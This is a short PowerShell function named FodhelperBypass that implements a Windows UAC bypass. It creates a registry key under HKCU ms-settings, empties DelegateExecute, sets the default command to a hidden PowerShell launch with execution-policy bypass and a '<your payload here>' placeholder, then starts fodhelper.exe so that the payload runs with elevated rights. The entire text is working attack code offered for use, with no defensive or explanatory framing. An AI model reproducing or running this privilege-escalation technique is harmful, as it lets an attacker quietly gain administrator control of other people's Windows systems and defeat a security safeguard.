function FodhelperBypass(){
	New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
	New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
	Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start powershell.exe -nop -W hidden -noni -ep bypass -c '<your payload here>'" -Force
	Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Normal
}